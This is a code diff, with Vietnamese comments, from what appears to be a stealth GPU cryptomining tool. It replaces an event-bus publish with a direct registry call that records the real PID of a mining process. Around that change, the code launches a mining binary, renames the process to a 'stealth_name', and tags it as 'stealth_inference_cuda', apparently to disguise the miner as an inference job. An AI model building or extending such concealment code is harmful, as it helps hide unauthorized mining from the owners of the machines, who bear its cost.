@@ -259,19 +259,44 @@ def main():
                 # Sau khi khởi động process con (mining binary):
                 time.sleep(3)  # Đảm bảo tiến trình mining đã cấp phát xong bộ nhớ lớn
                 # Đổi tên process như cũ
-                # Publish PID thật lên EventBus
+                # 🚀 **DIRECT REGISTRY REGISTRATION** (đăng ký registry trực tiếp) - THAY THẾ EVENTBUS
                 try:
-                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
-                    event_payload = {
-                        'pid': process.pid,
-                        'process_name': new_name,
+                    # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
+                    import sys
+                    import os
+                    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..'))
+                    from pid_logger.direct_registry import get_direct_registry
+                    
+                    # **Direct process registration** (đăng ký tiến trình trực tiếp) with metadata
+                    registry = get_direct_registry()
+                    process_metadata = {
+                        'stealth_name': new_name,
                         'role': 'real',
-                        'timestamp': time.time()
+                        'timestamp': time.time(),
+                        'wrapper_pid': os.getpid(),  # PID của stealth wrapper
+                        'stealth_enabled': True,
+                        'registration_source': 'stealth_inference_cuda'
                     }
-                    get_event_bus().publish('mining:gpu_pid_registered', event_payload)
-                    logger.info("✅ [GPU-POST-EXEC-STEALTH] Published gpu_pid_registered event for real PID")
-                except Exception as bus_err:
-                    logger.error(f"❌ [GPU-POST-EXEC-STEALTH] EventBus publish failed: {bus_err}")
+                    
+                    # **CORE REPLACEMENT**: Direct registry call thay thế EventBus publish
+                    success = registry.register_process(
+                        pid=process.pid,
+                        process_type="gpu", 
+                        process_obj=process,
+                        process_name=new_name,
+                        metadata=process_metadata
+                    )
+                    
+                    if success:
+                        logger.info(f"✅ [DIRECT-REGISTRY] Successfully registered GPU process: PID={process.pid}, Name={new_name}")
+                        logger.info(f"📊 [DIRECT-REGISTRY] Registration triggered immediate plugin notifications")
+                    else:
+                        logger.error(f"❌ [DIRECT-REGISTRY] Failed to register GPU process PID {process.pid}")
+                        
+                except Exception as registry_err:
+                    logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
+                    # **Fallback**: Vẫn tiếp tục chạy process nếu registry fail
+                    logger.warning(f"⚠️ [DIRECT-REGISTRY] Process will continue without registry - plugins may not activate")
             except Exception as rename_err:
                 logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
             
